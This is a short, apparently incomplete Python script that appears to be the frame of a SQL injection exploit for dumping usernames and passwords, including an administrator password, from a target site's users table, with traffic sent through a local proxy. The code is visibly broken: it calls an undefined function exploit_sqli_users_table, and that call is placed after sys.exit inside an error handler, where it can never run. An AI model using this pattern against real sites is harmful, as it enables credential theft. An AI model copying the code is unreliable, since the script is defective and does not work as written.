import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1', 'http': 'http://127.0.0.1'}

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

        print("[+] Dumping the usernames and passwords")
        if not exploit_sqli_users_table(url):
            print("[-] Did not find administrator password")